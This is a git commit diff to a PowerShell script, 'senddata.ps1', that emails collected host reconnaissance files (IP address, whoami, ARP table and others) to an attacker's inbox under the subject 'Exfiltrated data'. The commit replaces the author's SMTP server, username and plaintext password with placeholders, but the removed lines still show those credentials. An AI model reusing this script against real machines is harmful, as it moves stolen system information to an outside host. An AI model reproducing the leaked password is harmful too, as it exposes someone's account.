5389f0bb6e5462f33f9d5a508bc8793d40e25dd7
Jonathan Stross <53238095+JonathanStross@users.noreply.github.com>
2023-04-12 18:06:36 +0200

    Update senddata.ps1
    deleted my smtp

--- ps/senddata.ps1
+++ ps/senddata.ps1
@@ -1,10 +1,10 @@
 ﻿$From = "Victim <victim@victim.com>"
-$To = "Jonathan Stross <jonathan.stross@pathlock.com>"
+$To = "YOUR NAME <YOUR EMAIL ADDRESS>"
 $Subject = "Exfiltrated data"
 $Body = "Please find attached the exfiltrated data."
-$SMTPServer = "smtp-relay.sendinblue.com"
-$SMTPPort = "587"
-$Password = ConvertTo-SecureString "7RQ6jML4zFaEZHxX" -AsPlainText -Force
-$Username = "se.patlock@gmail.com"
+$SMTPServer = "yoursmtpserver.what"
+$SMTPPort = "smtpserverport"
+$Password = ConvertTo-SecureString "yourauthenticationtokensmtp" -AsPlainText -Force
+$Username = "smtp username"
 $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $Username, $Password
 Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -BodyAsHtml -SmtpServer $SMTPServer -Port $SMTPPort -Credential $Credentials -Attachments "ipaddress.txt", "landscape.txt", "whoami.txt", "arptable.txt"
